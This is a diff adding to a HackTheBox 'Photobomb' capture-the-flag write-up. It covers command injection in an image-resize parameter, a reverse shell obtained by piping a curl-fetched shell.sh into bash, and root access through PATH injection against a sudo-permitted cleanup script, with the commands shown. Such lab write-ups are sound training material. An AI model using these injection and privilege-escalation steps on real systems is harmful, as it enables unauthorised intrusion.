@@ -23,7 +23,7 @@ Not many stuff here - just ssh and http that shows us hostname which we add to o
 
 Trying to find out what the page uses by trying `http://photobomb.htb/index.php` returns us this:
 
-IMG1
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Photobomb/images/IMG1.png?raw=true)
 
 CLicking the link on the site redirects us to `/printer` which prompts us for credentials which we don't have right now. 
 There isn't anything else we can do right now so let's use feroxbuster to find other directories. But that doesn't return 
@@ -70,4 +70,74 @@ function init() {
 window.onload = init;
 ```
 
-Now we have creds so let's get to `/printer`. 
+Now we have creds so let's get to `/printer`. We can download photos. If we catch the request in burp we see that there is parameter
+dimensions which means that the server doesn't store all the images somewhere but rather converts them on the go. 
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Photobomb/images/IMG2.png?raw=true)
+
+Here we can try to do command injection starting with sleep. 
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Photobomb/images/IMG3.png?raw=true)
+
+And it works. Hosting python server with `shell.sh` and using curl and pipe into bash gives us reverse shell on nc listener 
+
+![alt text](https://github.com/vojtechsmola/CTF-write-ups/blob/main/HackTheBox-Write-Ups/Photobomb/images/IMG4.png?raw=true)
+
+and we get user flag. 
+
+```
+wizard@photobomb:~$ cat user.txt 
+75a86a8fe31f5**********
+```
+
+Looking at `sudo -l` there is file cleanup.sh:
+
+```
+wizard@photobomb:~$ sudo -l
+Matching Defaults entries for wizard on photobomb:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+```
+
+We can set enviroment variable while running the script cleanup.sh which looks like this:
+
+```
+root@photobomb:/home/wizard/photobomb# cat /opt/cleanup.sh 
+#!/bin/bash
+. /opt/.bashrc
+cd /home/wizard/photobomb
+
+# clean up log files
+if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
+then
+  /bin/cat log/photobomb.log > log/photobomb.log.old
+  /usr/bin/truncate -s0 log/photobomb.log
+fi
+
+# protect the priceless originals
+find source_images -type f -name '*.jpg' -exec chown root:root {} \;
+```
+
+There is find command that isn't using absolute path which we can abuse with PATH injection.
+
+```
+wizard@photobomb:/tmp# echo "/bin/bash -p" > find
+wizard@photobomb:/tmp$ export PATH=/tmp:$PATH
+User wizard may run the following commands on photobomb:
+    (root) SETENV: NOPASSWD: /opt/cleanup.sh
+wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh 
+root@photobomb:/home/wizard/photobomb# id
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+Now we can get flag from /root/root.txt:
+
+```
+root@photobomb:~# cat /root/root.txt 
+b76f595541ed616c2a3963b**********
+```
+
+This is it for this write up thank you for reading.
